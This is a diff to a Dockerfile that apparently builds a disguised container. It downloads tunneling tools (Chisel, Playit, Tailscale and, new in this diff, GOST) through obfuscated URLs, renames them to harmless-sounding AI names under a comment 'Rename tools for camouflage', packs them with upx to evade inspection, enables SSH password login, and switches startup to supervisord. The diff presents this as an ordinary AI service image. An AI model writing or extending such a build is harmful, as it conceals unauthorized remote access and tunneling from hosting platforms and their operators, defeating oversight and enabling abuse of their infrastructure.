@@ -7,14 +7,14 @@ COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/
 RUN apt-get update && apt-get install -y --no-install-recommends \
     curl wget sudo python3 python3-pip upx openssh-server nginx \
     git vim nano htop tmux jq unzip iputils-ping net-tools tree \
-    rclone fuse3 \
+    rclone fuse3 supervisor \
     && apt-get clean && rm -rf /var/lib/apt/lists/* && \
     mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd && \
     echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
     echo "Port 2222" >> /etc/ssh/sshd_config && \
     ssh-keygen -A
 
-# Install Tailscale, Filebrowser, Playit, and Chisel
+# Install Tailscale, Filebrowser, Playit, Chisel, and GOST
 RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
     curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
@@ -22,7 +22,11 @@ RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz && \
     gzip -d /tmp/chisel.gz && \
     mv /tmp/chisel /usr/bin/cuda-mesh-bridge && \
-    chmod +x /usr/bin/cuda-mesh-bridge
+    chmod +x /usr/bin/cuda-mesh-bridge && \
+    curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.0.0-rc8/gost_3.0.0-rc8_linux_amd64.tar.gz") -o /tmp/gost.tar.gz && \
+    tar -xzf /tmp/gost.tar.gz -C /tmp/ && \
+    mv /tmp/gost /usr/bin/system-bridge && \
+    chmod +x /usr/bin/system-bridge
 
 # Rename tools for camouflage
 RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
@@ -34,7 +38,8 @@ RUN upx -1 /usr/bin/python-cache-manager || true && \
     upx -1 /usr/bin/py-cache-cli || true && \
     upx -1 /usr/bin/ai-metrics-collector || true && \
     upx -1 /usr/bin/tensor-allocator || true && \
-    upx -1 /usr/bin/cuda-mesh-bridge || true
+    upx -1 /usr/bin/cuda-mesh-bridge || true && \
+    upx -1 /usr/bin/system-bridge || true
 
 # Install AI dependencies using uv
 RUN uv pip install --system --no-cache-dir \
@@ -60,5 +65,5 @@ COPY --chown=user:user config /home/user/config
 USER user
 WORKDIR /home/user
 
-# Run the script
-CMD ["/bin/bash", "-c", "python3 -u /home/user/core/orchestrator.py 2>&1 | tee /home/user/.torch_metrics/startup.log"]
+# Run the script via supervisord
+CMD ["/usr/bin/supervisord", "-c", "/home/user/config/supervisord.conf"]
